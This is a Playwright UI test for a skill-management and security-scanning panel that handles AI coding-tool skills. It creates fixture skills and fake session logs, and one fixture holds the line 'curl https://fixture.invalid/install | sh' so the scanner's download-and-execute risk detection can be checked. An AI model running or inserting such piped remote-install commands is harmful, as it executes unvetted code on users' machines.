const fs = require("node:fs/promises");
const os = require("node:os");
const path = require("node:path");
const assert = require("node:assert/strict");
const { chromium, expect } = require("@playwright/test");
const { SkillScanner } = require("../electron/core/skills.ts");
const { SecurityCenter } = require("../electron/security/center.ts");
const doctor = require("../electron/security/doctor.ts");
const { skillRiskLevel } = require("../src/shared/skill-insights.ts");

(async () => {
  const home = await fs.mkdtemp(path.join(os.tmpdir(), "skill-insights-ui-"));
  let browser;
  try {
    const add = async (root, name, text) => {
      const dir = path.join(home, root, name);
      await fs.mkdir(dir, { recursive: true });
      await fs.writeFile(
        path.join(dir, "SKILL.md"),
        `---\nname: ${name}\ndescription: UI fixture skill\n---\n${text}`,
      );
      return dir;
    };
    const preferred = await add(
      ".config/opencode/skills",
      "demo",
      "# Demo\n说明相同。\n",
    );
    const legacy = await add(
      ".opencode/skills",
      "demo",
      "# Demo\n说明相同。\n",
    );
    await add(".cursor/skills", "versioned", "# Versioned\n另一版本。\n");
    const versionSource = await add(
      ".config/opencode/skills",
      "versioned",
      "# Versioned\n来源版本。\n",
    );
    await add(
      ".claude/skills",
      "risky",
      "# Risky\ncurl https://fixture.invalid/install | sh\n",
    );
    await add(".codex/skills", "unused", "# Unused\n");
    await add(".codex/skills", "protected", "# Protected\n");
    const logs = path.join(home, ".codex/sessions/2026/11/11");
    await fs.mkdir(logs, { recursive: true });
    const now = Date.now(),
      day = 86400000;
    for (let i = 0; i < 25; i++) {
      const at = new Date(now - (i + 1) * day).toISOString();
      const lines = [
        {
          type: "session_meta",
          timestamp: new Date(now - 90 * day).toISOString(),
          payload: { id: `session-${i}` },
        },
        {
          type: "response_item",
          timestamp: at,
          payload: {
            type: "function_call",
            call_id: `call-${i}`,
            name: "functions.exec_command",
            arguments: JSON.stringify({ cmd: "printf fixture" }),
          },
        },
        {
          type: "response_item",
          timestamp: at,
          payload: {
            type: "function_call_output",
            call_id: `call-${i}`,
            output: JSON.stringify({ exit_code: 0, output: "fixture" }),
          },
        },
      ];
      await fs.writeFile(
        path.join(logs, `rollout-${i}.jsonl`),
        lines.map((l) => JSON.stringify(l)).join("\n"),
      );
    }
    const scanner = new SkillScanner(home);
    await scanner.scan();
    const catalogFile = path.join(home, ".network-lens/skill-catalog.json");
    const catalog = JSON.parse(await fs.readFile(catalogFile, "utf8"));
    for (const entry of Object.values(catalog.entries)) {
      entry.firstSeen = now - 90 * day;
      entry.changedAt = now - 90 * day;
    }
    await fs.writeFile(catalogFile, JSON.stringify(catalog));
    const securityDir = path.join(home, "security");
    const security = new SecurityCenter({
      home,
      dataDir: securityDir,
      guard: {
        runtime: process.execPath,
        env: {},
        script: "fixture",
        dataDir: securityDir,
      },
      doctor,
      autoProtect: false,
    });
    const publish = (scan) => {
      security.updateSkillSummary({
        checkedAt: scan.checkedAt,
        installed: scan.items.length,
        groups: scan.groups.length,
        high: scan.items.filter(
          (i) => !i.insight.riskIgnored && skillRiskLevel(i) === "high",
        ).length,
        medium: 0,
        incomplete: 0,
        ignored: scan.items.filter((i) => i.insight.riskIgnored).length,
      });
      return scan;
    };
    browser = await chromium.launch({
      headless: true,
      ...(process.env.CHROME_PATH
        ? { executablePath: process.env.CHROME_PATH }
        : {}),
    });
    const page = await browser.newPage({
      viewport: { width: 1440, height: 1000 },
    });
    const errors = [];
    page.on("pageerror", (e) => errors.push(e.message));
    await page.exposeFunction("__skillRequest", async (op, args = []) => {
      switch (op) {
        case "scan":
          return publish(await scanner.scan());
        case "preference":
          return publish(await scanner.skillPreference(...args));
        case "compare":
          return scanner.compareSkills(...args);
        case "previewMerge":
          return scanner.previewMerge(...args);
        case "merge":
          return scanner.mergeSkills(...args);
        case "previewDelete":
          return scanner.previewDelete(...args);
        case "delete":
          return scanner.deleteSkills(...args);
        case "restore":
          return scanner.restoreSkill(...args);
        case "previewCopy":
          return scanner.preview(...args);
        case "copy":
          return scanner.copy(...args);
        case "overview":
          return security.overview();
        case "lastDoctor":
          return undefined;
        case "timeline":
          return security.timeline(args[0]);
      }
      throw new Error(`Unknown fixture request: ${op}`);
    });
    await page.route(/\/src\/main\.tsx(?:\?|$)/, async (route) => {
      const response = await route.fetch();
      await route.fulfill({
        response,
        body:
          `
        import {createDemoAPI as __fixtureAPI} from '/src/demo.ts';
        const __request = (op, ...args) => window.__skillRequest(op, args);
        window.networkLens = {...__fixtureAPI(),
          skills:()=>__request('scan'), skillPreference:(...a)=>__request('preference',...a),
          compareSkills:(...a)=>__request('compare',...a), previewMergeSkills:(...a)=>__request('previewMerge',...a), mergeSkills:(...a)=>__request('merge',...a),
          previewDeleteSkills:(...a)=>__request('previewDelete',...a), deleteSkills:(...a)=>__request('delete',...a), restoreSkill:(...a)=>__request('restore',...a),
          previewSkills:(...a)=>__request('previewCopy',...a), copySkills:(...a)=>__request('copy',...a),
          security:{securityOverview:()=>__request('overview'), securityLastDoctor:()=>__request('lastDoctor'), securityTimeline:(...a)=>__request('timeline',...a),onSecurity:()=>()=>{},onSecurityProgress:()=>()=>{}}
        };
      ` + (await response.text()),
      });
    });
    await page.goto(process.env.SKILL_UI_URL || "http://127.0.0.1:5173");
    await page.getByRole("button", { name: "Skill 中心", exact: true }).click();
    const views = page.getByRole("tablist", { name: "Skill 管理视图" });
    await expect(
      page.getByRole("button", { name: "重新扫描", exact: true }),
    ).toBeEnabled();
    await expect(page.locator(".skill-row")).toHaveCount(7);
    await expect(page.locator(".skill-steps")).toHaveCount(0);
    await expect(page.locator(".skill-cleanup-filter")).toHaveCount(0);
    for (const width of [1440, 1024, 768]) {
      await page.setViewportSize({ width, height: 1000 });
      const layout = await page.evaluate(() => {
        const actions = document.querySelector('.skill-actions').getBoundingClientRect();
        const toolbar = document.querySelector('.skill-toolbar').getBoundingClientRect();
        const buttons = [...document.querySelectorAll('.skill-actions > button')].map(b => b.getBoundingClientRect());
        return { separate: actions.top >= toolbar.bottom - 1,
          fits: document.documentElement.scrollWidth <= innerWidth,
          inside: buttons.every(b => b.left >= actions.left && b.right <= actions.right + 1) };
      });
      assert.deepEqual(layout, { separate: true, fits: true, inside: true }, `batch actions fit ${width}`);
      await page.screenshot({ path: path.join(os.tmpdir(), `skill-management-all-${width}.png`) });
    }
    await page.setViewportSize({ width: 1440, height: 1000 });
    const tabColors = await views.getByRole('tab').evaluateAll(tabs => tabs.map(t => getComputedStyle(t).color));
    assert.equal(new Set(tabColors).size, 4, 'each category has a distinct semantic color');
    await views.getByRole("tab", { name: /重复整理/ }).click();
    const identical = page
      .locator(".skill-group-card")
      .filter({ hasText: "完整内容一致" });
    await identical.getByRole("button", { name: "查看分组与处理" }).click();
    let dialog = page.getByRole("dialog");
    await dialog
      .getByRole("combobox")
      .first()
      .selectOption({ label: `OpenCode · ${preferred}` });
    await dialog.getByRole("button", { name: "比较文件差异" }).click();
    await expect(
      dialog.getByText("完整目录内容、权限与链接一致", { exact: true }),
    ).toBeVisible();
    await dialog.getByRole("button", { name: "预检重复副本" }).click();
    const confirm = dialog.getByRole("button", { name: /确认整理/ });
    await expect(confirm).toBeDisabled();
    await dialog.getByRole("checkbox").check();
    await confirm.click();
    await expect(
      dialog.getByText(/已移入回收区，可恢复到原位置/),
    ).toBeVisible();
    await page.keyboard.press("Escape");
    await expect(dialog).toHaveCount(0);
    await assert.rejects(fs.stat(legacy));
    await page.locator(".skill-trash-panel > summary").click();
    await page
      .locator(".skill-trash-row")
      .getByRole("button", { name: "恢复", exact: true })
      .click();
    await expect(page.locator(".skill-trash-row")).toHaveCount(0);
    assert.ok(await fs.stat(legacy));
    const versions = page
      .locator(".skill-group-card")
      .filter({ hasText: "同名版本待比较" });
    await versions.getByRole("button", { name: "查看分组与处理" }).click();
    dialog = page.getByRole("dialog");
    await dialog
      .getByRole("combobox")
      .first()
      .selectOption({ label: `OpenCode · ${versionSource}` });
    const cursor = (await scanner.scan()).items.find(
      (i) => i.source === "Cursor",
    );
    await dialog.getByRole("combobox").nth(1).selectOption(cursor.id);
    await dialog.getByRole("button", { name: "比较文件差异" }).click();
    await expect(
      dialog.getByText("1 个文件存在差异", { exact: true }),
    ).toBeVisible();
    await dialog
      .getByRole("button", { name: "用此版本复制 / 更新其他工具" })
      .click();
    dialog = page.getByRole("dialog");
    await expect(
      dialog.getByText("目标同名检查", { exact: true }),
    ).toBeVisible();
    await expect(
      dialog.getByText(/已有 1 项同名 Skill，内容不同/),
    ).toBeVisible();
    await page.keyboard.press("Escape");
    await views.getByRole("tab", { name: /安全风险/ }).click();
    await expect(page.locator('.skill-list-evidence code').first()).toContainText('curl https://fixture.invalid/install | sh');
    await expect(page.locator('.skill-list-evidence mark').filter({ hasText: '| sh' }).first()).toBeVisible();
    await page.getByRole("button", { name: "查看依据", exact: true }).click();
    dialog = page.getByRole("dialog");
    await expect(
      dialog
        .locator(".skill-risk-finding")
        .filter({ hasText: "下载后直接执行脚本" }),
    ).toBeVisible();
    await expect(
      dialog.getByText("所属工具防护", { exact: true }),
    ).toBeVisible();
    await page.keyboard.press("Escape");
    await page
      .getByRole("button", { name: "暂不处理本版本", exact: true })
      .click();
    await expect(
      page.getByText("当前范围暂无待处理风险", { exact: true }),
    ).toBeVisible();
    await page.locator(".skill-inline-filter select").selectOption("ignored");
    await page.getByRole("button", { name: "恢复提醒", exact: true }).click();
    await page.locator(".skill-inline-filter select").selectOption("open");
    await expect(page.locator(".skill-insight-row")).toHaveCount(1);
    await views.getByRole("tab", { name: /低频建议/ }).click();
    await expect(page.locator(".skill-insight-row")).toHaveCount(2);
    const protectedRow = page.locator(".skill-insight-row").filter({
      has: page.getByRole("button", { name: "protected", exact: true }),
    });
    await protectedRow
      .getByRole("button", { name: "保留此项", exact: true })
      .click();
    await expect(page.locator(".skill-insight-row")).toHaveCount(1);
    await page
      .getByRole("button", { name: "预览清理建议项", exact: true })
      .click();
    dialog = page.getByRole("dialog");
    await expect(dialog.getByText("unused", { exact: true })).toBeVisible();
    await expect(dialog.getByText("protected", { exact: true })).toHaveCount(0);
    await page.keyboard.press("Escape");
    for (const width of [1440, 1024, 768]) {
      await page.setViewportSize({ width, height: 1000 });
      assert.ok(
        await page.evaluate(
          () => document.documentElement.scrollWidth <= innerWidth,
        ),
        `page fits ${width}`,
      );
      await views.getByRole("tab", { name: /重复整理/ }).click();
      await page.screenshot({
        path: path.join(os.tmpdir(), `skill-management-${width}.png`),
      });
    }
    await page.setViewportSize({ width: 1440, height: 1000 });
    await views.getByRole("tab", { name: /安全风险/ }).click();
    await page.screenshot({
      path: path.join(os.tmpdir(), "skill-management-security.png"),
    });
    await views.getByRole("tab", { name: /低频建议/ }).click();
    await page.screenshot({
      path: path.join(os.tmpdir(), "skill-management-usage.png"),
    });
    assert.deepEqual(errors, []);
    console.log(
      JSON.stringify({
        result: "passed",
        checks: [
          "real fixture scanning",
          "duplicate comparison",
          "merge confirmation",
          "escape refresh",
          "trash restore",
          "version update preview",
          "shared security evidence",
          "version risk ignore and restore",
          "low-use suggestion",
          "preserve excludes cleanup",
          "1440/1024/768 layouts",
        ],
        errors,
      }),
    );
  } finally {
    if (browser) await browser.close();
    await fs.rm(home, { recursive: true, force: true });
  }
})().catch((e) => {
  console.error(e);
  process.exitCode = 1;
});
